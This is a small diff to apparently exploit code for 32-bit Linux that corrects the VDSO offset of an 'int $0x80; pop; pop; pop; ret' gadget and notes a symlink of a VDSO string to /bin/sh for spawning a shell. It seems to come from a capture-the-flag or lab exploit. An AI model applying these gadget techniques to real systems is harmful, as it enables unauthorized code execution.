@@ -17,9 +17,11 @@
 // "sym\0" at VDSO, ln -sf /bin/sh sym
 const uint32_t STR_ADDR = VDSO_BASE + 0xbe9;
 
-// b36:	cd 80                	int    $0x80
-//  b38:	90                   	nop
-//  b39:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
+//  b57:	cd 80                	int    $0x80
+//  b59:	5d                   	pop    %ebp
+//  b5a:	5a                   	pop    %edx
+//  b5b:	59                   	pop    %ecx
+//  b5c:	c3                   	ret
 const uint32_t INT80_ADDR = VDSO_BASE + 0xb57;
 
 const uint32_t dummy = 0;
